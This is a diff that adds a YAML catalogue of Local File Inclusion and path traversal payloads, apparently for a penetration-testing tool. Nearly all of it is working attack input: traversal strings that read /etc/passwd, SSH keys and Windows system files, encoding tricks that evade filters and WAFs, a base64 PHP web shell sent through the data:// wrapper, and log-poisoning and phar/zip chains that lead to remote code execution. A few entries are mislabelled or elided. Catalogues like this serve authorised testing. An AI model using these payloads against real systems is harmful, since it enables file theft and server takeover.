@@ -1,0 +1,280 @@
+id: lfi
+name: Local File Inclusion / Path Traversal
+version: 1.0.0
+category: traversal
+description: |
+  Payloads for Local File Inclusion (LFI) and arbitrary path traversal. Covers
+  classic ../ traversal, PHP wrappers, Windows variants, encoding tricks, and
+  log poisoning chains that escalate LFI to RCE.
+mitre:
+  - T1083
+  - T1190
+  - T1006
+owasp_top10:
+  - A01:2021
+  - A05:2021
+references:
+  - https://owasp.org/www-community/attacks/Path_Traversal
+  - https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - https://portswigger.net/web-security/file-path-traversal
+  - https://github.com/payloadbox/file-inclusion-payload-list
+related_tools:
+  - ffuf
+  - nuclei
+  - feroxbuster
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: classic_passwd
+    name: Classic ../etc/passwd
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [linux, php, node]
+    severity_when_works: high
+    payload: ../../../../etc/passwd
+    notes: null
+    source: common knowledge
+  - id: deep_traversal
+    name: Deep traversal etc/passwd
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: high
+    payload: ../../../../../../../../../../etc/passwd
+    notes: null
+    source: common knowledge
+  - id: absolute_path
+    name: Absolute path /etc/passwd
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: high
+    payload: /etc/passwd
+    notes: When app does not enforce a root prefix
+    source: common knowledge
+  - id: null_byte_truncation
+    name: PHP null-byte truncation
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: high
+    payload: ../../../../etc/passwd%00
+    notes: PHP < 5.3.4
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: url_encoded_dot
+    name: URL-encoded traversal
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [linux, php]
+    severity_when_works: high
+    payload: ..%2f..%2f..%2fetc%2fpasswd
+    notes: null
+    source: common knowledge
+  - id: double_url_encoded
+    name: Double URL-encoded traversal
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [linux, php]
+    severity_when_works: high
+    payload: ..%252f..%252f..%252fetc%252fpasswd
+    notes: For WAFs that decode once before validation
+    source: common knowledge
+  - id: utf8_overlong
+    name: UTF-8 overlong encoding
+    subcategory: filter_bypass
+    encoding: mixed
+    tech_targets: [iis, asp]
+    severity_when_works: high
+    payload: ..%c0%af..%c0%af..%c0%afetc/passwd
+    notes: Classic IIS unicode bug variant
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: windows_boot_ini
+    name: Windows boot.ini
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [windows]
+    severity_when_works: high
+    payload: ..\..\..\..\windows\win.ini
+    notes: null
+    source: common knowledge
+  - id: windows_hosts
+    name: Windows hosts file
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [windows]
+    severity_when_works: high
+    payload: ..\..\..\..\windows\system32\drivers\etc\hosts
+    notes: null
+    source: common knowledge
+  - id: nested_traversal_bypass
+    name: Nested traversal bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, php]
+    severity_when_works: high
+    payload: ....//....//....//etc/passwd
+    notes: Bypass naive replace("../","")
+    source: https://portswigger.net/web-security/file-path-traversal
+  - id: php_filter_b64
+    name: PHP filter base64 read
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: high
+    payload: php://filter/convert.base64-encode/resource=index.php
+    notes: Reads source of arbitrary PHP files
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: php_filter_chain_rce
+    name: PHP filter chain RCE
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|...|resource=/etc/passwd
+    notes: "Hash sum chain for RCE without file upload (gist:synacktiv)"
+    source: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle.html
+  - id: php_data_wrapper
+    name: PHP data wrapper RCE
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+    notes: <?php system($_GET['c']); ?>
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: php_expect_wrapper
+    name: PHP expect wrapper RCE
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: expect://id
+    notes: Requires expect module enabled
+    source: common knowledge
+  - id: php_input_wrapper
+    name: PHP input wrapper
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: php://input
+    notes: Send PHP code in POST body
+    source: common knowledge
+  - id: proc_self_environ
+    name: /proc/self/environ poison
+    subcategory: log_poison
+    encoding: raw
+    tech_targets: [linux, php]
+    severity_when_works: critical
+    payload: ../../../../proc/self/environ
+    notes: Combine with User-Agent payload for RCE
+    source: common knowledge
+  - id: proc_self_cmdline
+    name: /proc/self/cmdline
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: medium
+    payload: ../../../../proc/self/cmdline
+    notes: Reveals process invocation
+    source: common knowledge
+  - id: apache_access_log
+    name: Apache access log poison
+    subcategory: log_poison
+    encoding: raw
+    tech_targets: [linux, php, apache]
+    severity_when_works: critical
+    payload: ../../../../var/log/apache2/access.log
+    notes: Combine with crafted User-Agent for RCE
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: nginx_access_log
+    name: Nginx access log poison
+    subcategory: log_poison
+    encoding: raw
+    tech_targets: [linux, php, nginx]
+    severity_when_works: critical
+    payload: ../../../../var/log/nginx/access.log
+    notes: null
+    source: common knowledge
+  - id: ssh_authorized_keys
+    name: SSH authorized keys
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: high
+    payload: ../../../../root/.ssh/authorized_keys
+    notes: null
+    source: common knowledge
+  - id: aws_metadata_via_lfi
+    name: AWS metadata via file
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [linux, aws]
+    severity_when_works: high
+    payload: file:///proc/self/cwd/aws-config
+    notes: null
+    source: common knowledge
+  - id: zip_wrapper
+    name: PHP zip wrapper
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: zip://shell.zip%23payload.php
+    notes: Upload zip then include inner file for RCE
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: phar_wrapper
+    name: PHP phar wrapper
+    subcategory: php_wrapper
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: phar://uploads/shell.phar/payload.txt
+    notes: Triggers PHP deserialisation on metadata
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: file_url_scheme
+    name: "file:// URL scheme"
+    subcategory: traversal
+    encoding: raw
+    tech_targets: [java, node]
+    severity_when_works: high
+    payload: file:///etc/passwd
+    notes: For URL-loading sinks
+    source: common knowledge
+  - id: backslash_traversal
+    name: Backslash traversal
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [windows]
+    severity_when_works: high
+    payload: ..\..\..\..\windows\win.ini
+    notes: null
+    source: common knowledge
+  - id: unicode_dot
+    name: Unicode fullwidth dot bypass
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [java, node]
+    severity_when_works: medium
+    payload: "．．/．．/．．/etc/passwd"
+    notes: Fullwidth FF0E sometimes normalised to ASCII dot
+    source: common knowledge
+  - id: question_mark_truncate
+    name: Question-mark truncation
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: medium
+    payload: /etc/passwd?
+    notes: Strips appended .pdf etc.
+    source: common knowledge
+  - id: semicolon_truncate
+    name: Semicolon truncation (Java)
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: medium
+    payload: /etc/passwd;.png
+    notes: Some servlets truncate at semicolons
+    source: common knowledge
